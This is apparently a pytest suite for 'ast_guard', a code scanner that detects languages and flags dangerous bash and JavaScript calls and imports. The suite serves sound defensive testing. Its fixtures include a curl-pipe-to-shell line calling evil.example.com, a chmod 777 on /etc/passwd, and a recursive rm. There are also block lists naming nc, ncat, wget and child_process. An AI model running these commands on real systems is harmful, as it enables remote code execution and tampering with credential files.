"""
Tests for the multi-language analysis engine (v1.4, Phase 2).

Skipped automatically if the optional ``ast-guard[multilang]`` extras are not
installed (tree-sitter + the bash/javascript language packs).
"""

import pytest

pytest.importorskip("tree_sitter")
pytest.importorskip("tree_sitter_bash")
pytest.importorskip("tree_sitter_javascript")

from ast_guard.multilang import (
    detect_language,
    detect_language_with_info,
    extract_metrics_multilang,
    is_multilang_available,
)
from ast_guard import lang_bash, lang_javascript, scan_multilang


# ---------------------------------------------------------------------------
# Language detection
# ---------------------------------------------------------------------------

class TestLanguageDetection:
    def test_shebang_bash(self):
        code = "#!/bin/bash\necho hello\n"
        assert detect_language(code) == "bash"

    def test_shebang_sh(self):
        assert detect_language("#!/bin/sh\nls -la\n") == "bash"

    def test_shebang_env_bash(self):
        assert detect_language("#!/usr/bin/env bash\necho hi\n") == "bash"

    def test_shebang_python(self):
        assert detect_language("#!/usr/bin/env python3\nprint(1)\n") == "python"

    def test_shebang_node(self):
        assert detect_language("#!/usr/bin/env node\nconsole.log(1)\n") == "javascript"

    def test_function_keyword_is_js(self):
        code = "function greet(name) { return 'hi ' + name; }\nconst x = () => 1;"
        assert detect_language(code) == "javascript"

    def test_def_is_python(self):
        code = "def foo(x):\n    return x + 1\n"
        assert detect_language(code) == "python"

    def test_import_from_is_python(self):
        code = "from collections import defaultdict\nimport os\n"
        assert detect_language(code) == "python"

    def test_bash_function_and_keywords(self):
        code = "do_work() {\n  if [ -f x ]; then\n    echo yes\n  fi\n}\n"
        assert detect_language(code) == "bash"

    def test_empty_is_unknown(self):
        assert detect_language("") == "unknown"
        assert detect_language("   \n  ") == "unknown"

    def test_random_text_is_unknown(self):
        assert detect_language("hello world this is just text") == "unknown"

    def test_es_module_import_is_js(self):
        code = "import fs from 'fs';\nconst x = require('child_process');\n"
        assert detect_language(code) == "javascript"


# ---------------------------------------------------------------------------
# Bash adapter
# ---------------------------------------------------------------------------

class TestBashAdapter:
    def test_dangerous_curl_eval_rm_detected(self):
        """True positive: dangerous calls show up in call_list + dangerous_calls."""
        code = """#!/bin/bash
curl http://evil.example.com/payload | sh
rm -rf /tmp/important
eval "$user_supplied"
chmod 777 /etc/passwd
"""
        m = extract_metrics_multilang(code, "bash")
        assert m["language"] == "bash"
        assert "curl" in m["call_list"]
        assert "rm" in m["call_list"]
        assert "eval" in m["call_list"]
        assert "chmod" in m["call_list"]
        assert set(m["dangerous_calls"]) >= {"curl", "rm", "eval", "chmod"}

    def test_safe_bash_has_no_dangerous_calls(self):
        """True negative: a plain script flags nothing."""
        code = """#!/bin/bash
greeting="hello world"
for name in alice bob carol; do
  echo "$greeting, $name"
done
"""
        m = extract_metrics_multilang(code, "bash")
        assert m["dangerous_calls"] == []
        assert "echo" in m["call_list"]
        assert m["loop_depth"] == 1

    def test_source_command_becomes_import(self):
        code = """#!/bin/bash
source ./helpers.sh
. /etc/profile
echo ok
"""
        m = extract_metrics_multilang(code, "bash")
        assert "./helpers.sh" in m["import_list"]
        assert "/etc/profile" in m["import_list"]

    def test_loop_depth_and_complexity(self):
        code = """#!/bin/bash
for a in 1 2 3; do
  for b in x y z; do
    if [ "$a" = "$b" ]; then
      echo match
    fi
  done
done
"""
        m = extract_metrics_multilang(code, "bash")
        assert m["loop_depth"] == 2
        # 1 (base) + 1 (if) + 2 (loops) = at least 4
        assert m["mccabe_complexity"] >= 4

    def test_function_complexities(self):
        code = """#!/bin/bash
check() {
  if [ -f /tmp/x ]; then
    echo found
  elif [ -d /tmp ]; then
    echo dir
  else
    echo missing
  fi
}
"""
        m = extract_metrics_multilang(code, "bash")
        assert "check" in m["function_complexities"]
        # if + elif => +2 over base of 1
        assert m["function_complexities"]["check"] >= 3

    def test_full_dangerous_blocklist_recognized(self):
        """Each dangerous name listed in the spec must be flagged when used."""
        expected = {
            "curl", "wget", "eval", "exec",
            "rm", "chmod", "chown",
            "dd", "mkfs",
            "nc", "ncat",
            "sudo", "pkill", "kill", "nohup",
        }
        assert expected.issubset(lang_bash.DANGEROUS_CALLS)
        # Compose a script that uses every one of them.
        lines = ["#!/bin/bash"] + [f"{name} arg" for name in sorted(expected)]
        code = "\n".join(lines) + "\n"
        m = extract_metrics_multilang(code, "bash")
        assert set(m["dangerous_calls"]) == expected

    def test_long_string_detection(self):
        big = "x" * 250
        code = f'#!/bin/bash\nmsg="{big}"\necho "$msg"\n'
        m = extract_metrics_multilang(code, "bash")
        assert m["long_string_count"] >= 1


# ---------------------------------------------------------------------------
# JavaScript adapter
# ---------------------------------------------------------------------------

class TestJavaScriptAdapter:
    def test_eval_and_function_detected(self):
        """True positive: eval and Function constructor are flagged."""
        code = """
function bad(s) {
  eval(s);
  return new Function('return 1')();
}
"""
        m = extract_metrics_multilang(code, "javascript")
        assert m["language"] == "javascript"
        assert "eval" in m["call_list"]
        assert "Function" in m["call_list"]
        assert "eval" in m["dangerous_calls"]
        assert "Function" in m["dangerous_calls"]

    def test_require_child_process_detected(self):
        """True positive: require('child_process') imports + execSync call."""
        code = """
const cp = require('child_process');
const { spawn } = require('child_process');
cp.execSync('ls');
spawn('rm', ['-rf', '/tmp']);
"""
        m = extract_metrics_multilang(code, "javascript")
        assert "child_process" in m["import_list"]
        assert "child_process" in m["dangerous_imports"]
        assert "cp.execSync" in m["call_list"]
        assert "execSync" in {c.split(".")[-1] for c in m["dangerous_calls"]}
        assert "spawn" in m["dangerous_calls"]

    def test_es_module_import_dangerous(self):
        code = """
import fs from 'fs';
import { connect } from 'net';
import vm from 'vm';
fs.readFileSync('/etc/passwd');
"""
        m = extract_metrics_multilang(code, "javascript")
        assert set(m["import_list"]) >= {"fs", "net", "vm"}
        assert set(m["dangerous_imports"]) >= {"fs", "net", "vm"}

    def test_safe_js_has_no_dangerous_calls(self):
        """True negative: pure logic, no escape hatches."""
        code = """
function add(a, b) {
  return a + b;
}
const data = [1, 2, 3].map(x => x * 2);
console.log(add(1, 2), data);
"""
        m = extract_metrics_multilang(code, "javascript")
        assert m["dangerous_calls"] == []
        assert m["dangerous_imports"] == []
        assert "add" in m["function_complexities"]

    def test_dynamic_import_detected(self):
        code = """
async function loadVm() {
  const vm = await import('vm');
  return vm;
}
"""
        m = extract_metrics_multilang(code, "javascript")
        assert "vm" in m["import_list"]
        assert "vm" in m["dangerous_imports"]

    def test_if_count_and_complexity(self):
        code = """
function pick(x) {
  if (x === 1) return 'a';
  else if (x === 2) return 'b';
  else if (x === 3) return 'c';
  return 'd';
}
"""
        m = extract_metrics_multilang(code, "javascript")
        # `else if` chains produce nested if_statement nodes; expect >= 3.
        assert m["if_count"] >= 3
        assert m["function_complexities"]["pick"] >= 4

    def test_loop_depth(self):
        code = """
for (let i = 0; i < 10; i++) {
  for (const x of arr) {
    while (x > 0) { break; }
  }
}
"""
        m = extract_metrics_multilang(code, "javascript")
        assert m["loop_depth"] == 3

    def test_dangerous_blocklist_constants(self):
        """The documented blocklists are exported as module constants."""
        assert {"eval", "Function", "execSync", "spawn", "exec"}.issubset(
            lang_javascript.DANGEROUS_CALLS
        )
        assert {"child_process", "fs", "net", "dgram", "cluster", "vm"}.issubset(
            lang_javascript.DANGEROUS_IMPORTS
        )


# ---------------------------------------------------------------------------
# Dispatcher
# ---------------------------------------------------------------------------

class TestDispatcher:
    def test_python_dispatch_returns_full_metric_dict(self):
        """The Python branch wraps the existing analyzer and still works."""
        code = "def foo(x):\n    if x > 0:\n        return x\n    return -x\n"
        m = extract_metrics_multilang(code, "python")
        assert m["language"] == "python"
        # Keys that analyzer.extract_metrics is contracted to return.
        for key in (
            "if_count", "guard_clause_count", "loop_depth", "mccabe_complexity",
            "literal_count", "long_string_count", "import_list", "call_list",
            "comprehension_count", "functional_call_count", "max_set_literal_size",
            "function_complexities", "enumeration_analysis",
        ):
            assert key in m

    def test_auto_detect(self):
        m = extract_metrics_multilang("#!/bin/bash\necho hi\n")
        assert m["language"] == "bash"

    def test_unsupported_language_raises(self):
        with pytest.raises(ValueError):
            extract_metrics_multilang("blah", "rust")

    def test_metric_dict_shape_matches_python_for_bash(self):
        """All language adapters return the same standard keys."""
        py_keys = set(extract_metrics_multilang("x = 1\n", "python").keys())
        bash_keys = set(extract_metrics_multilang("echo hi\n", "bash").keys())
        js_keys = set(extract_metrics_multilang("var x = 1;\n", "javascript").keys())
        # The non-Python adapters add a couple of extra fields; the core
        # contract is that every Python key is present in the others.
        assert py_keys.issubset(bash_keys)
        assert py_keys.issubset(js_keys)


# ---------------------------------------------------------------------------
# scan_multilang error surfacing
# ---------------------------------------------------------------------------

class TestScanMultilangErrorSurfacing:
    """Errors from scan_multilang must surface, not be swallowed as CLEAN.

    Regression: before, ``scan_multilang`` wrapped extract_metrics_multilang
    in ``except Exception`` and returned CLEAN for both unsupported languages
    and broken inputs, masking real configuration mistakes.
    """

    def test_unsupported_language_returns_error_verdict(self):
        r = scan_multilang("a=1", "a=2", language="ruby", telemetry_enabled=False)
        assert r["verdict"] == "ERROR"
        finding = r["checks"]["check_3_forbidden_calls"]["findings"][0]
        assert "Unsupported language" in finding["explanation"]
        assert "ruby" in finding["explanation"]

    def test_unsupported_language_lists_supported_options(self):
        r = scan_multilang("a=1", "a=2", language="cobol", telemetry_enabled=False)
        finding = r["checks"]["check_3_forbidden_calls"]["findings"][0]
        # Help the caller fix their mistake by naming the supported set.
        for supported in ("python", "bash", "javascript"):
            assert supported in finding["explanation"]

    def test_python_syntax_error_in_generated_returns_error(self):
        r = scan_multilang(
            "def f():\n    return 1\n",
            "def f(:\n",  # broken Python syntax
            language="python",
            telemetry_enabled=False,
        )
        assert r["verdict"] == "ERROR"
        assert r["checks"]["check_3_forbidden_calls"]["status"] == "CRITICAL"

    def test_happy_path_bash_still_works(self):
        """Regression check: the supported-language path is unchanged."""
        r = scan_multilang(
            "#!/bin/bash\necho hi\n",
            "#!/bin/bash\necho hi\n",
            language="bash",
            telemetry_enabled=False,
        )
        assert r["verdict"] == "CLEAN"
        assert "checks" in r and "telemetry" in r


# ---------------------------------------------------------------------------
# Enumeration analysis — Bash
# ---------------------------------------------------------------------------

class TestBashEnumerationAnalysis:
    def test_tp_case_statement_literal_branches(self):
        """Bash case with 6 literal arms → Check 5 WARNING in pair mode."""
        code = """#!/bin/bash
dispatch() {
  case "$1" in
    start)   echo starting   ;;
    stop)    echo stopping   ;;
    restart) echo restarting ;;
    reload)  echo reloading  ;;
    status)  echo status     ;;
    help)    echo help       ;;
  esac
}
"""
        m = extract_metrics_multilang(code, "bash")
        ea = m["enumeration_analysis"]
        assert len(ea) == 1
        entry = ea[0]
        assert entry["total_ifs"] >= 6
        assert entry["enumeration_ifs"] >= 6
        assert entry["loop_count"] == 0

    def test_tp_check5_fires_via_scan_multilang(self):
        """End-to-end: case-dispatch function triggers Check 5 WARNING."""
        orig = "#!/bin/bash\ndispatch() { echo generic; }\n"
        gen = """#!/bin/bash
dispatch() {
  case "$1" in
    start)   echo starting   ;;
    stop)    echo stopping   ;;
    restart) echo restarting ;;
    reload)  echo reloading  ;;
    status)  echo status     ;;
    help)    echo help       ;;
  esac
}
"""
        r = scan_multilang(orig, gen, language="bash", telemetry_enabled=False)
        assert r["checks"]["check_5_extensional_enumeration"]["status"] == "WARNING"

    def test_tn_case_with_wildcard_only(self):
        """A case with a catchall wildcard arm and one literal does not fire."""
        code = """#!/bin/bash
handle() {
  case "$1" in
    start) echo start ;;
    *)     echo other ;;
  esac
}
"""
        m = extract_metrics_multilang(code, "bash")
        ea = m["enumeration_analysis"]
        assert ea[0]["total_ifs"] == 2        # start + wildcard
        assert ea[0]["enumeration_ifs"] == 1  # only 'start' is literal; '*' is not

    def test_tn_loop_present_suppresses_check5(self):
        """A for-loop inside the function keeps loop_count > 1 → Check 5 silent."""
        code = """#!/bin/bash
process() {
  for item in a b c d e; do
    case "$item" in
      a) echo a ;;
      b) echo b ;;
      c) echo c ;;
      d) echo d ;;
      e) echo e ;;
      f) echo f ;;
    esac
  done
}
"""
        m = extract_metrics_multilang(code, "bash")
        ea = m["enumeration_analysis"]
        assert ea[0]["loop_count"] >= 1

    def test_tp_single_bracket_equality_detected(self):
        """POSIX [ "$x" = "y" ] form (single bracket, = operator) triggers enumeration."""
        code = """#!/bin/bash
solve() {
  if [ "$n" = "1" ]; then echo "one"; fi
  if [ "$n" = "2" ]; then echo "two"; fi
  if [ "$n" = "3" ]; then echo "three"; fi
  if [ "$n" = "4" ]; then echo "four"; fi
  if [ "$n" = "5" ]; then echo "five"; fi
}
"""
        m = extract_metrics_multilang(code, "bash")
        ea = m["enumeration_analysis"]
        assert len(ea) == 1
        entry = ea[0]
        assert entry["total_ifs"] >= 5
        assert entry["enumeration_ifs"] >= 5, (
            "Single-bracket [ ] equality comparisons should be counted as enumeration branches"
        )

    def test_tn_single_bracket_numeric_comparison_no_literal_side(self):
        """[ "$n" -gt 0 ] uses -gt, not = — not counted as string literal enumeration."""
        code = """#!/bin/bash
classify() {
  if [ "$n" -gt 0 ]; then echo positive; fi
  if [ "$n" -lt 0 ]; then echo negative; fi
  if [ "$n" -eq 0 ]; then echo zero; fi
}
"""
        m = extract_metrics_multilang(code, "bash")
        ea = m["enumeration_analysis"]
        # Only 3 ifs, below threshold of 5; enumeration_ifs should be 0
        # because -gt/-lt/-eq operators don't match the equality check
        assert ea[0]["enumeration_ifs"] == 0


# ---------------------------------------------------------------------------
# Enumeration analysis — JavaScript
# ---------------------------------------------------------------------------

class TestJSEnumerationAnalysis:
    def test_tp_switch_literal_cases(self):
        """JS switch with 6 string cases → enumeration_analysis populated."""
        code = """
function dispatch(action) {
  switch(action) {
    case "start":   doStart();   break;
    case "stop":    doStop();    break;
    case "reload":  doReload();  break;
    case "status":  doStatus();  break;
    case "restart": doRestart(); break;
    case "help":    doHelp();    break;
    default: throw new Error();
  }
}
"""
        m = extract_metrics_multilang(code, "javascript")
        ea = m["enumeration_analysis"]
        assert any(e["name"] == "dispatch" and e["enumeration_ifs"] >= 6 for e in ea)

    def test_tp_check5_fires_via_scan_multilang(self):
        """End-to-end: JS switch-dispatch triggers Check 5 WARNING."""
        orig = "function dispatch(a) { return a; }\n"
        gen = """
function dispatch(action) {
  switch(action) {
    case "start":   return 1;
    case "stop":    return 2;
    case "reload":  return 3;
    case "status":  return 4;
    case "restart": return 5;
    case "help":    return 6;
    default: return 0;
  }
}
"""
        r = scan_multilang(orig, gen, language="javascript", telemetry_enabled=False)
        assert r["checks"]["check_5_extensional_enumeration"]["status"] == "WARNING"

    def test_tn_non_literal_switch_cases(self):
        """Switch cases with variable values are not counted as enumeration."""
        code = """
function route(req) {
  switch(req.method) {
    case METHOD_GET:  return handleGet(req);
    case METHOD_POST: return handlePost(req);
    case METHOD_PUT:  return handlePut(req);
  }
}
"""
        m = extract_metrics_multilang(code, "javascript")
        ea = m["enumeration_analysis"]
        route = next((e for e in ea if e["name"] == "route"), None)
        assert route is None or route["enumeration_ifs"] == 0

    def test_tn_if_else_with_loop_suppresses_check5(self):
        """A for-loop inside the function suppresses Check 5."""
        code = """
function process(items) {
  for (const item of items) {
    if (item === "a") doA();
    else if (item === "b") doB();
    else if (item === "c") doC();
    else if (item === "d") doD();
    else if (item === "e") doE();
    else if (item === "f") doF();
  }
}
"""
        m = extract_metrics_multilang(code, "javascript")
        ea = m["enumeration_analysis"]
        proc = next((e for e in ea if e["name"] == "process"), None)
        assert proc is not None
        assert proc["loop_count"] >= 1


# ---------------------------------------------------------------------------
# detect_language_with_info
# ---------------------------------------------------------------------------

class TestDetectLanguageWithInfo:
    def test_shebang_bash_method(self):
        info = detect_language_with_info("#!/bin/bash\necho hi\n")
        assert info["language"] == "bash"
        assert info["method"] == "shebang"
        assert info["score"] == 0

    def test_shebang_python_method(self):
        info = detect_language_with_info("#!/usr/bin/env python3\nprint(1)\n")
        assert info["language"] == "python"
        assert info["method"] == "shebang"

    def test_shebang_node_method(self):
        info = detect_language_with_info("#!/usr/bin/env node\nconsole.log(1)\n")
        assert info["language"] == "javascript"
        assert info["method"] == "shebang"

    def test_keyword_score_python(self):
        code = "def foo(x):\n    return x + 1\n"
        info = detect_language_with_info(code)
        assert info["language"] == "python"
        assert info["method"] == "keyword_score"
        assert info["score"] > 0

    def test_keyword_score_bash(self):
        code = "do_work() {\n  if [ -f x ]; then\n    echo yes\n  fi\n}\n"
        info = detect_language_with_info(code)
        assert info["language"] == "bash"
        assert info["method"] == "keyword_score"
        assert info["score"] > 0

    def test_keyword_score_js(self):
        code = "const x = require('fs');\nfunction f() { return 1; }\n"
        info = detect_language_with_info(code)
        assert info["language"] == "javascript"
        assert info["method"] == "keyword_score"
        assert info["score"] > 0

    def test_empty_is_unknown(self):
        info = detect_language_with_info("")
        assert info["language"] == "unknown"
        assert info["method"] == "unknown"
        assert info["score"] == 0

    def test_random_text_is_unknown(self):
        info = detect_language_with_info("hello world just some text")
        assert info["language"] == "unknown"
        assert info["method"] == "unknown"


class TestIsMultilangAvailable:
    def test_returns_bool(self):
        assert isinstance(is_multilang_available(), bool)

    def test_available_in_this_env(self):
        # Since this file is only executed when tree-sitter is importable
        # (pytest.importorskip at the top), is_multilang_available must be True.
        assert is_multilang_available() is True
